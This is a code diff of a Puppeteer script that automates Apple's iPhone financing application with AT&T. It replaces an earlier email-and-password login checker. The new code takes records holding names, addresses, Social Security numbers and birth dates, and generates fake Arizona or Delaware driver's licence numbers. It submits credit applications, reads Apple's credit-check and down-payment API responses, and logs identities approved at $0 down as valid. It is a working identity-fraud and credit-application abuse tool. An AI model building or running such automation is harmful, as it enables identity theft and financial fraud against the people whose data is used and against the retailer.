@@ -5,6 +5,7 @@ import {
   LOAN_AMOUNTS,
   TIMEOUT_WAIT_FOR_NAVIGATION_MINUTES,
   TIMEOUT_WAIT_FOR_NAVIGATION_REFERRER_MINUTES,
+  TIMEOUT_WAIT_FOR_RESPONSE_APPLE_MINUTES,
 } from './constants';
 import {
   generateOutputMessage,
@@ -15,6 +16,10 @@ import path from 'path';
 import fs from 'fs';
 import logger from './logger/logger';
 import { HEADLESS, proxyConfig } from './app';
+import { generateRandomNumberWithPrefix } from './utils/generate-random-number-with-prefix';
+import { CreditCheckResponse } from './api/apple/interfaces/CreditCheckResponse';
+import { ValidateAddresResponse } from './api/apple/interfaces/ValidateAddresResponse';
+import { DownPaymentResponse } from './api/apple/interfaces/DownPaymentResponse';
 
 export const TIMEOUT_WAIT_FOR_NAVIGATION_MILLISECONDS = minutesToMilliseconds(
   TIMEOUT_WAIT_FOR_NAVIGATION_MINUTES,
@@ -22,6 +27,14 @@ export const TIMEOUT_WAIT_FOR_NAVIGATION_MILLISECONDS = minutesToMilliseconds(
 
 export const TIMEOUT_WAIT_FOR_NAVIGATION_REFERRER_MILLISECONDS =
   minutesToMilliseconds(TIMEOUT_WAIT_FOR_NAVIGATION_REFERRER_MINUTES);
+
+export const TIMEOUT_WAIT_FOR_RESPONSE_APPLE = minutesToMilliseconds(
+  TIMEOUT_WAIT_FOR_RESPONSE_APPLE_MINUTES,
+);
+
+export const TIMEOUT_DEFAULT = minutesToMilliseconds(
+  TIMEOUT_WAIT_FOR_RESPONSE_APPLE_MINUTES,
+);
 
 export const SCREENSHOT_DISABLED = true;
 
@@ -32,6 +45,39 @@ const logTracking = (message: string, email: string) => {
 const getLoanAmountValue = () =>
   LOAN_AMOUNTS[getRamdomValue(0, LOAN_AMOUNTS.length - 1)];
 
+enum DriverLicenceState {
+  AZ = 'AZ',
+  DE = 'DE',
+}
+
+const getDriverLicense = (state: DriverLicenceState) => {
+  switch (state) {
+    case DriverLicenceState.DE:
+      return generateRandomNumberWithPrefix('0', 6);
+    case DriverLicenceState.AZ:
+      let prefixList = ['A', 'B', 'D', 'R'];
+
+      let prefix = prefixList[getRamdomValue(0, prefixList.length - 1)];
+
+      return generateRandomNumberWithPrefix(prefix, 8);
+
+    default:
+      return generateRandomNumberWithPrefix('0', 6);
+  }
+};
+
+const formatBid = (bid: string) => {
+  const bidDate = new Date(bid);
+
+  bidDate.setMinutes(bidDate.getMinutes() + bidDate.getTimezoneOffset());
+
+  return new Intl.DateTimeFormat('en-US', {
+    year: 'numeric',
+    month: '2-digit',
+    day: '2-digit',
+  }).format(bidDate);
+};
+
 interface PageConfiguration {
   pageUrl: string;
   loanAmountSelector: string;
@@ -41,6 +87,7 @@ interface PageConfiguration {
 interface ConfigurationPerPage {
   xfinity: PageConfiguration;
   pilotflyingj: PageConfiguration;
+  apple: PageConfiguration;
 }
 
 const CONFIGURATION_PER_PAGE: ConfigurationPerPage = {
@@ -54,6 +101,25 @@ const CONFIGURATION_PER_PAGE: ConfigurationPerPage = {
     loanAmountSelector: '#amount',
     formSelector: '#homepage-form',
   },
+  apple: {
+    pageUrl:
+      'https://www.apple.com/shop/buy-iphone/iphone-15-pro/6.7-inch-display-256gb-blue-titanium-att',
+    loanAmountSelector: '#amount',
+    formSelector: '#homepage-form',
+  },
+};
+
+const generateInputNameSelector = (name: string) => `[name=${name}]`;
+
+const API_URLS = {
+  apple: {
+    validateAddress:
+      '/WebObjects/IPACustomer.woa/wa/IPAPreAuthAction/api/validate-address',
+    creditCheck:
+      '/WebObjects/IPACustomer.woa/wa/IPAPreAuthAction/api/credit-check',
+    downPayment:
+      '/WebObjects/IPACustomer.woa/wa/IPAPreAuthAction/api/down_payment',
+  },
 };
 
 const SELECTORS = {
@@ -62,7 +128,51 @@ const SELECTORS = {
   submitButton: '#loginForm > div > button',
   userHint: '#user-hint',
   passwdHint: '#passwd-hint',
+  paymentOptions: {
+    // finance: "[for='27309d31-6efe-11ee-8d1d-4dbb2e2b063b']",
+    finance:
+      '.rf-po-bfe-purchaseoptionsedit .rf-po-bfe-dimension-base:nth-child(2) input',
+    carrier: '.rf-po-bfe-tabpills-container > li:nth-child(3) > button',
+    att: '.rf-po-bfe-financingoptions-tabs-container > div:nth-child(3) > fieldset .rf-po-bfe-financingoption:nth-child(1) input',
+    no_apple_care: '#applecareplus_59_noapplecare_label',
+    continue_button: '.as-purchaseinfo-button button',
+  },
+  att_apply_page: {
+    newCustomer: 'input#NEW',
+    continue_button:
+      '#root > div.show > div > div > div > form > div.buttons-div.button-customer-selection > button',
+  },
+  apple_form: {
+    firstName: generateInputNameSelector('firstName'),
+    lastName: generateInputNameSelector('lastName'),
+    email: generateInputNameSelector('email'),
+    addressLine1: generateInputNameSelector('addressLine1'),
+    addressLine2: generateInputNameSelector('addressLine2'),
+    city: generateInputNameSelector('city'),
+    addressState: generateInputNameSelector('addressState'),
+    zipcode: generateInputNameSelector('zipcode'),
+    phonenumber: generateInputNameSelector('phonenumber'),
+    idnumber: generateInputNameSelector('idnumber'),
+    idState: generateInputNameSelector('idState'),
+    dateOfBirth: generateInputNameSelector('dateOfBirth'),
+    socialSecurity: generateInputNameSelector('socialSecurity'),
+    continue_button:
+      '#root > div.show > div > div > div > div > form:nth-child(2) > div.buttons-div > button:nth-child(2)',
+    suggestedAddressButton:
+      '#root > div.show > div > div > div > div > form:nth-child(1) > div > div > div > div > div > div > div.buttons-div.recommended-address-button > button',
+  },
+  apple_plan: {
+    installmentPlans: 'input[name=planSelection]',
+    continue_button:
+      '#root > div.show > div > div.as-l-container > div > div.page-body.page-body-margin > div > form > div.buttons-div > button:nth-child(2)',
+    continue_button_wireless:
+      '#root > div.show > div > div > div.page-body.page-body-margin > form > div.buttons-div > button:nth-child(2)',
+    continue_button_number_plan:
+      '#root > div.show > div > div > div.page-body.form-margin-top > form > div.buttons-div.button-port-in > button:nth-child(2)',
+  },
 };
+
+// [...document.querySelectorAll("input[name=planSelection]")][1].click()
 
 const getIP = async () => {
   try {
@@ -146,9 +256,11 @@ export const getCredentialInformationScrapper = async (
   // const page = await browser.newPage();
   let page = await _browser.newPage();
 
+  page.setDefaultTimeout(TIMEOUT_DEFAULT);
+
   await page.setViewport({
-    width: 1920,
-    height: 1080,
+    width: 1920 / 1.5,
+    height: 1080 / 1.5,
   });
 
   let ip = '';
@@ -180,6 +292,8 @@ export const getCredentialInformationScrapper = async (
 
       page = await _browser.newPage();
 
+      page.setDefaultTimeout(TIMEOUT_DEFAULT);
+
       await page.setViewport({
         width: 1920 / 1.5,
         height: 1080 / 1.5,
@@ -209,41 +323,286 @@ export const getCredentialInformationScrapper = async (
 
     // await page.select(loanAmountSelector, loanAmountValue);
 
-    // TODO: Add logic to select a loan amount
+    await page.waitForSelector(SELECTORS.paymentOptions.finance);
 
-    // await page.type(SELECTORS.lastNameInput, credential.lastname);
+    await page.evaluate((SELECTORS) => {
+      const element = document?.querySelector(
+        SELECTORS.paymentOptions.finance,
+      ) as HTMLInputElement | null;
 
-    // await page.type(SELECTORS.firstNameInput, credential.name);
+      if (element) {
+        element.click();
+      }
+    }, SELECTORS);
 
-    await page.type(SELECTORS.emailInput, credential.email);
+    await page.waitForSelector(SELECTORS.paymentOptions.carrier);
 
-    await page.type(SELECTORS.password, credential.password);
+    await page.evaluate((SELECTORS) => {
+      const element = document?.querySelector(
+        SELECTORS.paymentOptions.carrier,
+      ) as HTMLInputElement | null;
 
-    // await page.type(SELECTORS.ssnInput, credential.last4ssn);
+      if (element) {
+        element.click();
+      }
+    }, SELECTORS);
+
+    await page.waitForSelector(SELECTORS.paymentOptions.att);
+
+    await page.evaluate((SELECTORS) => {
+      const element = document?.querySelector(
+        SELECTORS.paymentOptions.att,
+      ) as HTMLInputElement | null;
+
+      if (element) {
+        element.click();
+      }
+    }, SELECTORS);
+
+    await new Promise((r) => setTimeout(r, 1500));
+
+    await page.waitForSelector(SELECTORS.paymentOptions.no_apple_care);
+
+    await page.evaluate((SELECTORS) => {
+      const element = document?.querySelector(
+        SELECTORS.paymentOptions.no_apple_care,
+      ) as HTMLInputElement | null;
+
+      if (element) {
+        element.click();
+        element.click();
+      }
+    }, SELECTORS);
+
+    await new Promise((r) => setTimeout(r, 2000));
+
+    await page.waitForSelector(SELECTORS.paymentOptions.continue_button);
+
+    await page.evaluate((SELECTORS) => {
+      const element = document?.querySelector(
+        SELECTORS.paymentOptions.continue_button,
+      ) as HTMLInputElement | null;
+
+      if (element) {
+        element.click();
+      }
+    }, SELECTORS);
 
     await Promise.all([
-      await page.click(SELECTORS.submitButton),
+      // await page.click(SELECTORS.submitButton),
       await page.waitForNavigation({
         timeout: TIMEOUT_WAIT_FOR_NAVIGATION_MILLISECONDS,
         waitUntil: 'domcontentloaded',
       }),
     ]);
 
-    await new Promise((r) => setTimeout(r, 800));
+    await page.waitForSelector(SELECTORS.att_apply_page.newCustomer);
 
-    if (page.url().includes('home')) {
-      const outputMessage = generateOutputMessage(credential, page.url(), ip);
+    await page.evaluate((SELECTORS) => {
+      const element = document?.querySelector(
+        SELECTORS.att_apply_page.newCustomer,
+      ) as HTMLInputElement | null;
 
-      logger.info(outputMessage);
+      if (element) {
+        element.click();
+      }
+    }, SELECTORS);
 
-      validWriteLineOnFile(outputMessage);
+    await page.waitForSelector(SELECTORS.att_apply_page.continue_button);
+
+    await page.evaluate((SELECTORS) => {
+      const element = document?.querySelector(
+        SELECTORS.att_apply_page.continue_button,
+      ) as HTMLInputElement | null;
+
+      if (element) {
+        element.click();
+      }
+    }, SELECTORS);
+
+    // await page.waitForNetworkIdle();
+
+    // console.log('ready to set data on form!');
+
+    await page.waitForSelector(SELECTORS.apple_form.firstName);
+
+    const driverLicenceGenerated = getDriverLicense(
+      credential.state as DriverLicenceState,
+    );
+
+    await page.type(SELECTORS.apple_form.firstName, credential.name);
+    await page.type(SELECTORS.apple_form.lastName, credential.lastname);
+    await page.type(SELECTORS.apple_form.email, credential.email);
+    await page.type(SELECTORS.apple_form.addressLine1, credential.address);
+    await page.type(SELECTORS.apple_form.addressState, credential.state);
+    await page.type(SELECTORS.apple_form.city, credential.city);
+    await page.type(SELECTORS.apple_form.idState, credential.state);
+    await page.type(SELECTORS.apple_form.zipcode, credential.zipCode);
+    await page.type(SELECTORS.apple_form.phonenumber, credential.phoneNumber);
+    await page.type(SELECTORS.apple_form.idnumber, driverLicenceGenerated);
+    await page.type(SELECTORS.apple_form.idState, credential.state);
+
+    console.log(formatBid(credential.bid));
+
+    await page.type(
+      SELECTORS.apple_form.dateOfBirth,
+      formatBid(credential.bid),
+    );
+
+    await page.type(SELECTORS.apple_form.socialSecurity, credential.ssn);
+
+    await page.waitForSelector(SELECTORS.apple_form.continue_button);
+
+    await page.click(SELECTORS.apple_form.continue_button);
+
+    const originURL = new URL(page.url()).origin;
+
+    const validateAddressResponse = (await (
+      await page.waitForResponse(originURL + API_URLS.apple.validateAddress, {
+        timeout: TIMEOUT_WAIT_FOR_RESPONSE_APPLE,
+      })
+    ).json()) as ValidateAddresResponse;
+
+    if (validateAddressResponse.data.globalAddress.matchStatus === 'EXACT') {
+      //GOOOOOD
+
+      console.log('GOOD Address');
     } else {
-      const outputMessage = generateOutputMessage(credential, page.url(), ip);
+      console.log('suggested Address');
+
+      await page.waitForSelector(SELECTORS.apple_form.suggestedAddressButton);
+
+      await new Promise((r) => setTimeout(r, 1500));
+
+      await page.click(SELECTORS.apple_form.suggestedAddressButton);
+    }
+
+    const creditCheckResponse = (await (
+      await page.waitForResponse(originURL + API_URLS.apple.creditCheck, {
+        timeout: TIMEOUT_WAIT_FOR_RESPONSE_APPLE,
+      })
+    ).json()) as CreditCheckResponse;
+
+    if (creditCheckResponse.nextPage === 'getInstallmentPlans') {
+      //GOOOOOD
+
+      console.log('GOOD CREDIT');
+
+      await page.waitForSelector(SELECTORS.apple_plan.installmentPlans);
+
+      const installmentPlansElements = await page.$$(
+        SELECTORS.apple_plan.installmentPlans,
+      );
+
+      await installmentPlansElements[1].click();
+
+      await new Promise((r) => setTimeout(r, 1500));
+
+      await page.waitForSelector(SELECTORS.apple_plan.continue_button);
+
+      await page.click(SELECTORS.apple_plan.continue_button);
+
+      await page.waitForSelector('[name=portin-type]');
+
+      await page.evaluate(() => {
+        (
+          document.querySelectorAll('[name=portin-type]')[1] as HTMLInputElement
+        )?.click();
+      });
+
+      await new Promise((r) => setTimeout(r, 1500));
+
+      // button continue click after select number
+      await page.waitForSelector(
+        SELECTORS.apple_plan.continue_button_number_plan,
+      );
+
+      await page.click(SELECTORS.apple_plan.continue_button_number_plan);
+
+      await page.waitForSelector(SELECTORS.apple_plan.installmentPlans);
+
+      const installmentPlansWirelessElements = await page.$$(
+        SELECTORS.apple_plan.installmentPlans,
+      );
+
+      await installmentPlansWirelessElements[2].click();
+
+      await new Promise((r) => setTimeout(r, 1500));
+
+      await page.waitForSelector(SELECTORS.apple_plan.continue_button_wireless);
+
+      await page.click(SELECTORS.apple_plan.continue_button_wireless);
+
+      const originDownPaymentURL = new URL(page.url()).origin;
+
+      const downPaymentResponse = (await (
+        await page.waitForResponse(
+          originDownPaymentURL + API_URLS.apple.downPayment,
+          {
+            timeout: TIMEOUT_WAIT_FOR_RESPONSE_APPLE,
+          },
+        )
+      ).json()) as DownPaymentResponse;
+
+      ///               Down Payment validation block              ///
+      if (downPaymentResponse.data.downPayment === '$0') {
+        const outputMessage = generateOutputMessage(
+          credential,
+          page.url(),
+          driverLicenceGenerated,
+        );
+
+        logger.info(outputMessage);
+
+        validWriteLineOnFile(outputMessage);
+      } else {
+        const outputMessage = generateOutputMessage(
+          credential,
+          page.url(),
+          driverLicenceGenerated,
+          downPaymentResponse.data.downPayment,
+        );
+
+        logger.error(outputMessage);
+
+        invalidWriteLineOnFile(outputMessage);
+      }
+      ///               Down Payment validation block              ///
+    } else {
+      const outputMessage = generateOutputMessage(
+        credential,
+        page.url(),
+        driverLicenceGenerated,
+      );
 
       logger.error(outputMessage);
 
       invalidWriteLineOnFile(outputMessage);
     }
+
+    // await Promise.all([
+    //   await page.click(SELECTORS.submitButton),
+    //   await page.waitForNavigation({
+    //     timeout: TIMEOUT_WAIT_FOR_NAVIGATION_MILLISECONDS,
+    //     waitUntil: 'domcontentloaded',
+    //   }),
+    // ]);
+
+    await new Promise((r) => setTimeout(r, 3000));
+
+    // if (page.url().includes('home')) {
+    //   const outputMessage = generateOutputMessage(credential, page.url(), ip);
+
+    //   logger.info(outputMessage);
+
+    //   validWriteLineOnFile(outputMessage);
+    // } else {
+    //   const outputMessage = generateOutputMessage(credential, page.url(), ip);
+
+    //   logger.error(outputMessage);
+
+    //   invalidWriteLineOnFile(outputMessage);
+    // }
 
     if (SCREENSHOT_DISABLED) {
       await page.screenshot({
